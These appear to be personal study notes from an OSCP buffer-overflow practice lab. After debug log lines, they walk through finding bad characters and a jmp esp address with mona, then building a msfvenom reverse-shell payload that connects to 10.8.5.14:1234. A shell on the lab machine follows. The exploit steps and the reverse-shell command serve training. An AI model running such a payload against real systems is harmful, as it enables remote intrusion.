[debug] Node name: Netcat Result
[2021-01-18 09:21:21.225] [   ] [debug] Node name: Socket Script
[2021-01-18 09:25:25.865] [   ] [debug] Node name: notes
[2021-01-18 09:25:33.855] [   ] [debug] Node name: Exploit
[2021-01-18 09:34:17.571] [   ] [debug] Node name: notes
[2021-01-18 09:34:26.168] [   ] [debug] Node name: Pattern Create
[2021-01-18 09:37:32.642] [   ] [debug] Node name: notes
[2021-01-18 09:37:41.096] [   ] [debug] Node name: Offsect Value
[2021-01-18 09:48:11.517] [   ] [debug] Node name: notes
[2021-01-18 09:48:20.925] [   ] [debug] Node name: Control Eip
[2021-01-18 10:05:55.885] [   ] [debug] Node name: Findind Badchar
[2021-01-18 12:20:28.554] [   ] [debug] Node name: Control Eip
[2021-01-18 12:21:11.904] [   ] [debug] Node name: Findind Badchar
[2021-01-18 12:21:20.524] [   ] [debug] Node name: Control Eip
[2021-01-18 12:21:40.577] [   ] [debug] Node name: Offsect Value
[2021-01-18 12:21:48.383] [   ] [debug] Node name: Control Eip
[2021-01-18 12:21:57.093] [   ] [debug] Node name: Findind Badchar
[2021-01-18 12:30:02.143] [   ] [debug] Node name: Control Eip
[2021-01-18 12:31:17.195] [   ] [debug] Node name: Verify Offset EIP ESP
[2021-01-18 12:39:55.592] [   ] [debug] Node name: Findind Badchar
[2021-01-18 12:40:03.103] [gtk] [critical] gtk_tree_model_get_iter: assertion 'path->depth > 0' failed
[2021-01-18 12:40:03.104] [   ] [debug] Node name: Verify Offset EIP ESP
[2021-01-18 12:40:03.107] [   ] [debug] Node name: Findind Badchar
[2021-01-18 12:40:10.718] [   ] [debug] Node name: Findind Badchar
[2021-01-18 12:40:12.529] [   ] [debug] Node name: Verify Offset EIP ESP
[2021-01-18 12:40:14.695] [   ] [debug] Node name: Findind Badchar

As we got four bad chars let's use mona to add in arrey using -b bytearrey 'badchar'
our_badchar=\x00\x07\x2e\xa0

and send the payload again and verify the badchar...if on popup saying undefind that means there is no bad char...

Now to get the jump eip we need to check the !mona modules

if there is all false in popup window that means that module of the app is vulnrable...

now find the jump esp ....

 !mona find -s "\xff\xe4" -m somvuln.dll 

this will retun the address of jump eip
   save the jump eip 311712f3 set this eip in payload as
   eip=eip= '\xf3\x12\x17\x31'
in this case...
#jmp 0x625011af
to little indian form

jmp="\xaf\x11\x50\x62"



creating the shellcode.. 
msfvenom -p windows/shell_reverse_tcp LHOST=10.8.5.14 LPORT=1234 -b '\x00\x07\x2e\xa0' -f c

and copyt the output and paste in our program as shellcode value..

now payload is.....


'A'*offsetvalue
jmp="\xaf\x11\x50\x62"
nopt='\x90'*10
shellcode=msfoutput

start the listener and send the payload...

got the shell 

C:\Users\admin\Desktop\vulnerable-apps\oscp>whoami
whoami
oscp-bof-prep\admin





